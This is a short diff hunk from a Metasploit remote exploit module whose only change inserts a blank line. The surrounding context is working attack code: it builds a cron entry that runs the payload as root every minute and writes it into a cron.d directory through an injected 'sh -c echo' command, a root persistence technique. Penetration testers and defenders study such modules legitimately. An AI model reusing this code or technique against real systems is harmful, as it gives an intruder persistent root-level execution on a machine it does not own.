@@ -93,6 +93,7 @@ class MetasploitModule < Msf::Exploit::Remote
    cli_loaded()
  
    @cron_name = rand_text_alpha_upper(6)  
+   
    mc = "* * * * * root #{payload.raw}"
 
    all = "sh -c \"echo '#{mc}' > /#{@cron_name}/etc/cron.d/#{@cron_name}\""
